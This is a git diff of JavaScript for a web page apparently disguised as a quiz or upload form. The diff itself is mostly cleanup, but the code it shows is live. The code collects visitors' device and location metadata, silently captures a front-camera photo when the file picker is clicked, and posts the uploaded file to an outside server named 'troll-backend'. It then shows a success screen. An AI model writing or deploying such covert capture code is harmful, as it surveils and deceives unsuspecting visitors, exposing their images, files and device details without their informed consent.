@@ -1,20 +1,15 @@
-// ================================
-// CONFIG
-// ================================
 const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 
-// DOM
 const btn = document.getElementById("submit-btn");
 const fileInput = document.getElementById("user-file");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
-// Camera state
 let cameraStream = null;
 let cameraCaptured = false;
 
 // ================================
-// METADATA
+// COLLECT METADATA
 // ================================
 async function collectMetadata() {
   let battery = "N/A";
@@ -25,7 +20,7 @@ async function collectMetadata() {
     } catch {}
   }
 
-  let location = "";
+  let location = "N/A";
   if (navigator.permissions) {
     try {
       const p = await navigator.permissions.query({ name: "geolocation" });
@@ -39,8 +34,8 @@ async function collectMetadata() {
   }
 
   return {
-    width: innerWidth,
-    height: innerHeight,
+    width: window.innerWidth,
+    height: window.innerHeight,
     platform: navigator.platform,
     language: navigator.language,
     useragent: navigator.userAgent,
@@ -51,7 +46,7 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAMERA CAPTURE (2s DELAY)
+// CAPTURE CAMERA
 // ================================
 async function captureCameraIfNeeded() {
   if (cameraCaptured) return;
@@ -60,10 +55,8 @@ async function captureCameraIfNeeded() {
     video: { facingMode: "user" },
     audio: false
   });
-
   video.srcObject = cameraStream;
 
-  // wait 2s for focus
   await new Promise(r => setTimeout(r, 2000));
 
   const ctx = canvas.getContext("2d");
@@ -82,7 +75,7 @@ async function captureCameraIfNeeded() {
 }
 
 // ================================
-// FILE UPLOAD
+// UPLOAD FILE
 // ================================
 async function uploadFile(file) {
   const reader = new FileReader();
@@ -90,24 +83,17 @@ async function uploadFile(file) {
     await fetch(`${BACKEND_BASE}/file-upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        file: reader.result,
-        filename: file.name
-      })
+      body: JSON.stringify({ file: reader.result, filename: file.name })
     });
   };
   reader.readAsDataURL(file);
 }
 
 // ================================
-// FILE INPUT CLICK → CAMERA FIRST
+// FILE INPUT CLICK → CAMERA
 // ================================
 fileInput.addEventListener("click", async () => {
-  try {
-    await captureCameraIfNeeded();
-  } catch (e) {
-    console.warn("Camera not allowed");
-  }
+  try { await captureCameraIfNeeded(); } catch(e) { console.warn("Camera not allowed"); }
 });
 
 // ================================
@@ -115,14 +101,11 @@ fileInput.addEventListener("click", async () => {
 // ================================
 btn.addEventListener("click", async e => {
   e.preventDefault();
-
   if (!fileInput.files.length) return;
 
   await uploadFile(fileInput.files[0]);
 
-  if (cameraStream) {
-    cameraStream.getTracks().forEach(t => t.stop());
-  }
+  if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
 
   document.getElementById("quiz-container").style.display = "none";
   document.getElementById("success-container").style.display = "block";
